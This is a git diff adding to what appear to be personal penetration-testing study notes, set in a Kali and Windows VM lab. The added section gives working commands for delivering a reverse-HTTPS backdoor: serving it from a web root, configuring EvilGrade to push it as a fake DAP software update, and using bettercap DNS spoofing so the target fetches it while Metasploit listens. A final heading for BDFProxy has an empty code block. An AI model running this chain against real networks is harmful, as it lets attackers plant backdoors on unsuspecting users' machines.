@@ -110,4 +110,44 @@ set LPORT 8080
 exploit
 ```
 
+* To check if backdoor works, we first need to move the backdoor file to the location '/var/www/html'.Then, after starting the Kali web server, we can use the Windows VM to visit the specific directory of the backdoor file.
+
+* We can use EvilGrade to launch a fake upgrade in order to make the target download the backdoor:
+
+```shell
+cd /opt/evilgrade
+
+./evilgrade
+
+show modules
+
+configure dap #this selects the module 'dap'
+
+show options
+
+set agent /var/www/html/evil-files/rev_https_8080.exe #path of backdoor file
+
+set endsite www.speedbit.com
+
+start
+
+#Now we would want to be the MITM, so in a separate terminal we can use spoof.cap and DNS spoofing; note that metasploit is still listening for incoming connections in the background
+
+bettercap -iface eth0 -caplet spoof.cap
+
+set dns.spoof.all true
+
+set dns.spoof.domains update.speedbit.com
+
+dns.spoof on
+
+#Now we can check the software(DAP) for updates on the Windows machine, and get access to it remotely
+```
+
+* Another method for downloading backdoors is using a software called BDFProxy:
+
+```shell
+
+```
+
 ---
